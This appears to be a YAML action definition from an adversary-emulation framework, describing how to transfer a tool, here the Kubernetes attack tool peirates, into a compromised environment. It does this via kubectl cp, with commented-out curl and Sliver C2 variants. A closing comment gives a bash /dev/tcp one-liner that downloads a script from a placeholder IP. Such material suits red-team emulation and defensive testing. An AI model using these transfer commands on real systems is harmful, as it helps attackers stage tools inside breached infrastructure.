name: Upload Tool or File
description: Transfer tools or other files from an external system into a compromised environment.
tactic: Command And Control
techniques: ["Ingress Tool Transfer"]
parameters:
  SRC_PATH:
    type: string
    description: Path to the file which will be transfered to the target system
  DST_PATH:
    type: string
    description: Path on the target system where the file will be transfered
args:
  SRC_PATH: "../static/peirates"
  DST_PATH: "/tmp/peirates"
cmdVariants:
  # - key: curl
  #   command: curl -F 'data=@${SRC_PATH}' ${DST_PATH}
  #   isLocal: true
  - key: kubectl
    command: kubectl cp ${SRC_PATH}:${DST_PATH}
    isLocal: true
    precondition:
      - "target.hasBinary(tar)"
  # - key: sliver
  #   command: get_file ${SRC_PATH}
preconditions:
  accessLevel: user-write
  # kind: Pod, System
effects:
  - "target.hasFile($f)"
#  try this onliner to download a file
# bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
